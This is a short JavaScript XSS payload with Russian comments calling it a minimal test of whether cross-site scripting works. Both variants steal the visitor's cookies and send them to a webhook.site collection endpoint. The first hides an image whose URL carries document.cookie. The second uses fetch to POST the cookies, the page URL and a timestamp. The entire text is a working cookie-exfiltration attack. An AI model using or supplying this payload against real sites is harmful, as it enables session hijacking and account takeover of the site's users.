// ОЧЕНЬ ПРОСТАЯ ВЕРСИЯ - для быстрого тестирования
// Минимальный код для проверки работает ли XSS

// Вариант 1: Самый простой - просто отправка cookies через GET
document.write('<img src="https://webhook.site/8c30f542-6903-4488-8aa9-0609f3eb8972?test=success&c='+document.cookie+'" style="display:none;">');

// Вариант 2: С более подробной информацией через POST
fetch('https://webhook.site/8c30f542-6903-4488-8aa9-0609f3eb8972', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    url: location.href,
    cookies: document.cookie,
    time: new Date().toISOString()
  })
});

